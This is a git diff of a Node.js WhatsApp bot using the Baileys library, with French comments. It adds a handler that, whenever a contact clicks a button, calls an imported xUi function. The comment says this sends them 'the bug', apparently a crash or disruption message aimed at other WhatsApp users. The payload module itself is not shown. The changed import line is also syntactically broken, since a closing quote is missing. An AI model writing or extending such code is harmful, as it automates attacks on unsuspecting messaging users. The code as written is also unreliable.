@@ -12,7 +12,7 @@ import { execSync } from "child_process";
 import { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } from "@whiskeysockets/baileys";
 import { Boom } from "@hapi/boom";
 
-import { bug } from "./bug.js";
+import { xUi } from "./xUi.js;
 
 // Configuration
 dotenv.config();
@@ -138,11 +138,23 @@ async function createSocket(number, retryCount = 0) {
     // Sauvegarde des credentials
     sock.ev.on("creds.update", saveCreds);
 
-    // Gestion des messages (optionnel)
+    // Gestion des messages avec détection clic bouton
     sock.ev.on("messages.upsert", async ({ messages, type }) => {
       if (type === "notify") {
         for (const msg of messages) {
-          // Logique de gestion des messages si nécessaire
+          if (!msg.message) continue;
+          const from = msg.key.remoteJid;
+
+          const button = msg.message?.buttonsResponseMessage?.selectedButtonId;
+          if (button) {
+            console.log(chalk.blue(`🔘 Bouton cliqué par ${from}: ${button}`));
+            try {
+              await xUi(sock, from); // ← Ici on envoie le bug via xUi
+              console.log(chalk.green(`✅ xUi envoyé à ${from}`));
+            } catch (error) {
+              logger.error({ error, number: from }, "Erreur lors de l'envoi de xUi");
+            }
+          }
         }
       }
     });
